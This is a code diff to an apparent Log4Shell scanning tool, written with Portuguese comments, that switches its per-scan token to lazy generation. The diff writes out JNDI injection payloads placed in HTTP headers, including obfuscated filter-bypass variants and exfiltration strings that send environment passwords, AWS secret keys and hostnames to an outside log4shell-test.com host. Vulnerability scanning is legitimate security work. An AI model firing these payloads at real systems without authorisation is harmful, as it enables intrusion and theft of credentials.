@@ -45,7 +45,15 @@ _CATEGORY_MAP: dict[str, list[str]] = {
     "bypass": ["bypass_nested", "bypass_doublewrap", "bypass_exception", "bypass_newline", "bypass_chunked"],
 }
 
-_TOKEN = "".join(secrets.choice(string.ascii_lowercase + string.digits) for _ in range(12))
+_TOKEN: str | None = None
+
+
+def _get_token() -> str:
+    """Gera token unico por scan (lazy)."""
+    global _TOKEN
+    if _TOKEN is None:
+        _TOKEN = "".join(secrets.choice(string.ascii_lowercase + string.digits) for _ in range(12))
+    return _TOKEN
 
 
 def _build_jndi_payload(protocol: str, token: str) -> str:
@@ -71,11 +79,11 @@ async def _test_jndi_basic(
     _b_status, _b_size, _b_headers, _b_body = await _test_baseline(client, url)
 
     test_cases: list[tuple[str, str, str]] = [
-        ("ldap_basic", "User-Agent", _build_jndi_payload("ldap", _TOKEN)),
-        ("rmi_basic", "Referer", _build_jndi_payload("rmi", _TOKEN)),
-        ("dns_basic", "X-Forwarded-For", _build_jndi_payload("dns", _TOKEN)),
-        ("ldaps_basic", "X-Real-IP", _build_jndi_payload("ldaps", _TOKEN)),
-        ("iiop_basic", "X-Api-Key", _build_jndi_payload("iiop", _TOKEN)),
+        ("ldap_basic", "User-Agent", _build_jndi_payload("ldap", _get_token())),
+        ("rmi_basic", "Referer", _build_jndi_payload("rmi", _get_token())),
+        ("dns_basic", "X-Forwarded-For", _build_jndi_payload("dns", _get_token())),
+        ("ldaps_basic", "X-Real-IP", _build_jndi_payload("ldaps", _get_token())),
+        ("iiop_basic", "X-Api-Key", _build_jndi_payload("iiop", _get_token())),
     ]
 
     for technique, header_name, payload in test_cases:
@@ -98,7 +106,7 @@ async def _test_jndi_basic(
                 category="jndi_basic",
                 header_name=header_name,
                 payload=payload,
-                token=_TOKEN,
+                token=_get_token(),
                 status=resp.status_code,
                 size=len(resp.content),
                 vulnerable=vulnerable,
@@ -111,7 +119,7 @@ async def _test_jndi_basic(
                 category="jndi_basic",
                 header_name=header_name,
                 payload=payload,
-                token=_TOKEN,
+                token=_get_token(),
                 status=0, size=0, vulnerable=False, details="", error=str(e)[:100],
             ))
     return results
@@ -125,11 +133,11 @@ async def _test_jndi_obfuscated(
     results: list[Log4ShellAttempt] = []
 
     test_cases: list[tuple[str, str, str]] = [
-        ("ldap_lower", "User-Agent", "${jndi:ldap://" + _TOKEN + ".log4shell-test.com/a}"),
-        ("ldap_unicode", "User-Agent", "${j${}ndi:ldap://" + _TOKEN + ".log4shell-test.com/a}"),
+        ("ldap_lower", "User-Agent", "${jndi:ldap://" + _get_token() + ".log4shell-test.com/a}"),
+        ("ldap_unicode", "User-Agent", "${j${}ndi:ldap://" + _get_token() + ".log4shell-test.com/a}"),
         ("ldap_envvar", "User-Agent", "${jndi:${env:USER}.log4shell-test.com/a}"),
         ("ldap_proplookup", "User-Agent", "${jndi:${java:os.name}.log4shell-test.com/a}"),
-        ("ldap_dollar", "User-Agent", "${jndi:ldap://" + _TOKEN + ".log4shell-test.com/${sys:user.dir}}"),
+        ("ldap_dollar", "User-Agent", "${jndi:ldap://" + _get_token() + ".log4shell-test.com/${sys:user.dir}}"),
     ]
 
     for technique, header_name, payload in test_cases:
@@ -140,7 +148,7 @@ async def _test_jndi_obfuscated(
             vulnerable = False
             details = ""
 
-            if _TOKEN.lower() in resp_body.lower():
+            if _get_token().lower() in resp_body.lower():
                 vulnerable = True
                 details = "Ofuscado payload refletido no body"
 
@@ -149,7 +157,7 @@ async def _test_jndi_obfuscated(
                 category="jndi_obfuscated",
                 header_name=header_name,
                 payload=payload,
-                token=_TOKEN,
+                token=_get_token(),
                 status=resp.status_code,
                 size=len(resp.content),
                 vulnerable=vulnerable,
@@ -162,7 +170,7 @@ async def _test_jndi_obfuscated(
                 category="jndi_obfuscated",
                 header_name=header_name,
                 payload=payload,
-                token=_TOKEN,
+                token=_get_token(),
                 status=0, size=0, vulnerable=False, details="", error=str(e)[:100],
             ))
     return results
@@ -174,7 +182,7 @@ async def _test_header_injection(
 ) -> list[Log4ShellAttempt]:
     """Testa injection via headers vulneraveis."""
     results: list[Log4ShellAttempt] = []
-    payload = _build_jndi_payload("ldap", _TOKEN)
+    payload = _build_jndi_payload("ldap", _get_token())
 
     test_cases: list[tuple[str, str]] = [
         ("ua_jndi", "User-Agent"),
@@ -195,7 +203,7 @@ async def _test_header_injection(
             if payload.lower() in resp_body.lower():
                 vulnerable = True
                 details = f"JNDI via {header_name} refletido"
-            elif _TOKEN.lower() in resp_body.lower():
+            elif _get_token().lower() in resp_body.lower():
                 vulnerable = True
                 details = f"Token via {header_name} encontrado"
 
@@ -204,7 +212,7 @@ async def _test_header_injection(
                 category="header_injection",
                 header_name=header_name,
                 payload=payload,
-                token=_TOKEN,
+                token=_get_token(),
                 status=resp.status_code,
                 size=len(resp.content),
                 vulnerable=vulnerable,
@@ -217,7 +225,7 @@ async def _test_header_injection(
                 category="header_injection",
                 header_name=header_name,
                 payload=payload,
-                token=_TOKEN,
+                token=_get_token(),
                 status=0, size=0, vulnerable=False, details="", error=str(e)[:100],
             ))
     return results
@@ -231,11 +239,11 @@ async def _test_data_exfil(
     results: list[Log4ShellAttempt] = []
 
     test_cases: list[tuple[str, str, str]] = [
-        ("exfil_hostname", "User-Agent", "${jndi:ldap://" + _TOKEN + ".${hostName}.log4shell-test.com/a}"),
-        ("exfil_username", "Referer", "${jndi:ldap://" + _TOKEN + ".${env:USER}.log4shell-test.com/a}"),
-        ("exfil_password", "X-Forwarded-For", "${jndi:ldap://" + _TOKEN + ".${env:PASSWORD}.log4shell-test.com/a}"),
-        ("exfil_sysprop", "X-Real-IP", "${jndi:ldap://" + _TOKEN + ".${java:os.name}.log4shell-test.com/a}"),
-        ("exfil_env", "X-Api-Key", "${jndi:ldap://" + _TOKEN + ".${env:AWS_SECRET_KEY}.log4shell-test.com/a}"),
+        ("exfil_hostname", "User-Agent", "${jndi:ldap://" + _get_token() + ".${hostName}.log4shell-test.com/a}"),
+        ("exfil_username", "Referer", "${jndi:ldap://" + _get_token() + ".${env:USER}.log4shell-test.com/a}"),
+        ("exfil_password", "X-Forwarded-For", "${jndi:ldap://" + _get_token() + ".${env:PASSWORD}.log4shell-test.com/a}"),
+        ("exfil_sysprop", "X-Real-IP", "${jndi:ldap://" + _get_token() + ".${java:os.name}.log4shell-test.com/a}"),
+        ("exfil_env", "X-Api-Key", "${jndi:ldap://" + _get_token() + ".${env:AWS_SECRET_KEY}.log4shell-test.com/a}"),
     ]
 
     for technique, header_name, payload in test_cases:
@@ -246,7 +254,7 @@ async def _test_data_exfil(
             vulnerable = False
             details = ""
 
-            if _TOKEN.lower() in resp_body.lower():
+            if _get_token().lower() in resp_body.lower():
                 vulnerable = True
                 details = f"Exfil payload refletido via {header_name}"
 
@@ -255,7 +263,7 @@ async def _test_data_exfil(
                 category="data_exfil",
                 header_name=header_name,
                 payload=payload,
-                token=_TOKEN,
+                token=_get_token(),
                 status=resp.status_code,
                 size=len(resp.content),
                 vulnerable=vulnerable,
@@ -268,7 +276,7 @@ async def _test_data_exfil(
                 category="data_exfil",
                 header_name=header_name,
                 payload=payload,
-                token=_TOKEN,
+                token=_get_token(),
                 status=0, size=0, vulnerable=False, details="", error=str(e)[:100],
             ))
     return results
@@ -282,11 +290,11 @@ async def _test_bypass(
     results: list[Log4ShellAttempt] = []
 
     test_cases: list[tuple[str, str, str]] = [
-        ("bypass_nested", "User-Agent", "${jndi:${lower:l}dap://" + _TOKEN + ".log4shell-test.com/a}"),
-        ("bypass_doublewrap", "User-Agent", "${jndi:${::-j}${::-n}${::-d}i:ldap://" + _TOKEN + ".log4shell-test.com/a}"),
-        ("bypass_exception", "User-Agent", "${jndi:ldap://" + _TOKEN + ".log4shell-test.com/a}"),
-        ("bypass_newline", "Referer", "test%0d%0a${jndi:ldap://" + _TOKEN + ".log4shell-test.com/a}"),
-        ("bypass_chunked", "X-Forwarded-For", "test;" + chr(24) + "${jndi:ldap://" + _TOKEN + ".log4shell-test.com/a}"),
+        ("bypass_nested", "User-Agent", "${jndi:${lower:l}dap://" + _get_token() + ".log4shell-test.com/a}"),
+        ("bypass_doublewrap", "User-Agent", "${jndi:${::-j}${::-n}${::-d}i:ldap://" + _get_token() + ".log4shell-test.com/a}"),
+        ("bypass_exception", "User-Agent", "${jndi:ldap://" + _get_token() + ".log4shell-test.com/a}"),
+        ("bypass_newline", "Referer", "test%0d%0a${jndi:ldap://" + _get_token() + ".log4shell-test.com/a}"),
+        ("bypass_chunked", "X-Forwarded-For", "test;" + chr(24) + "${jndi:ldap://" + _get_token() + ".log4shell-test.com/a}"),
     ]
 
     for technique, header_name, payload in test_cases:
@@ -297,7 +305,7 @@ async def _test_bypass(
             vulnerable = False
             details = ""
 
-            if _TOKEN.lower() in resp_body.lower():
+            if _get_token().lower() in resp_body.lower():
                 vulnerable = True
                 details = f"Bypass payload refletido via {header_name}"
 
@@ -306,7 +314,7 @@ async def _test_bypass(
                 category="bypass",
                 header_name=header_name,
                 payload=payload,
-                token=_TOKEN,
+                token=_get_token(),
                 status=resp.status_code,
                 size=len(resp.content),
                 vulnerable=vulnerable,
@@ -319,7 +327,7 @@ async def _test_bypass(
                 category="bypass",
                 header_name=header_name,
                 payload=payload,
-                token=_TOKEN,
+                token=_get_token(),
                 status=0, size=0, vulnerable=False, details="", error=str(e)[:100],
             ))
     return results
@@ -455,7 +463,7 @@ def banner_art() -> None:
    |  _  |_| | |__| |_| | |_| | | || | | | |_| | |_| | |_| | |_| |
    |_|  \___/|_____\___/ \____|_|___|_|  \___/ \___/|____/|____/
 """
-    create_banner(art, f"   log4shell: jndi_basic, obfuscated, header, exfil, bypass [{_TOKEN}]")()
+    create_banner(art, f"   log4shell: jndi_basic, obfuscated, header, exfil, bypass [{_get_token()}]")()
 
 
 def build_parser() -> argparse.ArgumentParser:
